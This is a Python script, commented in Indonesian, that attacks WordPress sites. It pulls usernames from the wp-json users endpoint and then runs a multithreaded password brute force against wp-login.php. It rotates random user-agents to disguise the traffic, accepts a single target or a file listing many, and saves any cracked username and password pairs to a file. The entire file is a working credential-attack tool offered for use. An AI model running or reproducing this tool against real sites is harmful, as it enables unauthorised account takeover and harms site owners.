import requests
from urllib.parse import urlparse
import threading
import random
import warnings
from urllib3.exceptions import InsecureRequestWarning
from models.control import save as SV
from models.output import *

# Menonaktifkan peringatan InsecureRequestWarning
warnings.filterwarnings("ignore", category=InsecureRequestWarning)

# Daftar user-agent yang akan digunakan secara random
user_agents = [
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:77.0) Gecko/20190101 Firefox/77.0",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:77.0) Gecko/20100101 Firefox/77.0",
    "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",
    "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
    "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)",
    "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)",
    "Mozilla/1.22 (compatible; MSIE 10.0; Windows 3.1)",
    "Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US))",
    "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; Media Center PC 6.0; InfoPath.3; MS-RTC LM 8; Zune 4.7)",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; Media Center PC 6.0; InfoPath.3; MS-RTC LM 8; Zune 4.7",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Zune 4.0; InfoPath.3; MS-RTC LM 8; .NET4.0C; .NET4.0E)",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Zune 4.0; Tablet PC 2.0; InfoPath.3; .NET4.0C; .NET4.0E)",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; chromeframe/11.0.696.57)",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0) chromeframe/10.0.648.205",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)"
]

# Fungsi untuk memilih user-agent secara acak
def get_random_user_agent():
    return random.choice(user_agents)

# Fungsi untuk mengecek protokol dan fallback ke HTTP jika HTTPS gagal
def check_protocol(url):
    parsed_url = urlparse(url)
    protocols = ["https", "http"]
    for protocol in protocols:
        modified_url = url.replace(parsed_url.scheme, protocol)
        try:
            response = requests.get(
                f"{modified_url}/wp-json/wp/v2/users",
                timeout=5,
                verify=False
            )
            if response.status_code == 200:
                print(f"{info} Target {blue}{modified_url}{white} accessible.")
                return modified_url
        except requests.exceptions.RequestException:
            continue
    return None

# Fungsi untuk melakukan enumerasi username
def enumerate_usernames(url):
    try:
        response = requests.get(
            f"{url}/wp-json/wp/v2/users",
            headers={"User-Agent": get_random_user_agent()},
            verify=False
        )
        if response.status_code == 200:
            users = response.json()
            return [user['slug'] for user in users]
    except Exception:
        return []
    return []

# Fungsi untuk melakukan brute force login dengan threading
def brute_force_login(url, usernames, password_list, thread_count=10):
    login_url = f"{url}/wp-login.php"
    success = False

    def attempt_login(username, password):
        nonlocal success
        try:
            response = requests.post(
                login_url,
                data={"log": username, "pwd": password, "wp-submit": "Log In"},
                headers={"User-Agent": get_random_user_agent()},
                verify=False,
                allow_redirects=False
            )
            if response.status_code == 302 and "Location" in response.headers:
                print(f"{suc} Login berhasil: {username}:{password}")
                SV("wpbf_success", f"{url} => {username} => {password}")
                success = True
            else:
                print(f"{fail} Login gagal: {username}:{password}")
        except Exception:
            pass

    threads = []
    for username in usernames:
        for password in password_list:
            if success:
                break
            thread = threading.Thread(target=attempt_login, args=(username, password))
            threads.append(thread)
            thread.start()

            if len(threads) >= thread_count:
                for thread in threads:
                    thread.join()
                threads = []

    for thread in threads:
        thread.join()


def start_brute_force(targets, password_file, thread_count=10):
    try:
        with open(password_file, "r") as file:
            password_list = [line.strip() for line in file.readlines()]
    except FileNotFoundError:
        print(f"{error} File password tidak ditemukan.")
        return

    for target in targets:
        url = check_protocol(target)
        if url:
            usernames = enumerate_usernames(url)
            if usernames:
                brute_force_login(url, usernames, password_list, thread_count)
            else:
                print(f"{error} Tidak ada username ditemukan.")
        else:
            print(f"{error} Tidak dapat mengakses target {blue}{target}{white}")

# Menu input dari user untuk memilih single atau multiple target
def main():
    print("[1] Single Target")
    print("[2] Multiple Targets")
    choice = input("Pilih opsi (1 atau 2): ")

    thread_count = int(input("Masukkan jumlah thread (default 10): ") or 10)

    if choice == "1":
        target = input("Masukkan URL target: ")
        start_brute_force([target], input("Masukkan file password list: "), thread_count)
    elif choice == "2":
        target_file = input("Masukkan file yang berisi list target: ")
        try:
            with open(target_file, "r") as file:
                targets = [line.strip() for line in file.readlines()]
            start_brute_force(targets, input("Masukkan file password list: "), thread_count)
        except FileNotFoundError:
            print(f"{error} File list target tidak ditemukan.")
    else:
        print(f"{error} Pilihan tidak valid.")

if __name__ == "__main__":
    main()
